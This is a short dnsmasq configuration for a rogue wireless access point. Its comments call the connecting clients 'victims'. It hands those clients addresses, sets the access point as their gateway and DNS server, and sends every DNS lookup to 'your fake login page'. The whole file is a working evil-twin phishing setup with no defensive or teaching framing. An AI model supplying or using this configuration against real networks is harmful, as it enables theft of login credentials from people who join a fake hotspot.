interface=wlp4s0f4u1
bind-interfaces
dhcp-range=192.168.1.100,192.168.1.150,12h  # IP address range to assign to victims
dhcp-option=3,192.168.1.1               # Default gateway set to the AP itself
dhcp-option=6,192.168.1.1               # DNS server set to the AP itself
address=/#/192.168.1.1                  # Redirect all DNS queries to 192.168.1.1 (your fake login page)
log-queries                             # Optional: log DNS queries for debugging
log-dhcp                                # Optional: log DHCP leases

